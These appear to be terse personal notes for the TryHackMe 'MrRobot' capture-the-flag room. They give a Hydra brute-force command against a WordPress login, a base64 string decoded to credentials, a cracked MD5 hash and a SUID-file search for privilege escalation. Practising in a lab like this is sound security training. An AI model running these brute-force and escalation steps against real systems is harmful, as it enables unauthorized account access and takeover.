# MrRobot
https://tryhackme.com/room/mrrobot

`export IP=10.10.26.130`

`join`, temp e-mail: dlisa05@cmusicsxil.com

license: what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
ZWxsaW90OkVSMjgtMDY1Mgo= > elliot:ER28-0652

User: Elliot
Pass: `hydra -l Elliot -P ./fsocity.dic $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30`

user robot
password md5: c3fcd3d76192e4007dfb496cca67e13b > abcdefghijklmnopqrstuvwxyz

Find SUID files
`find / -perm +6000 2>/dev/null | grep '/bin/'`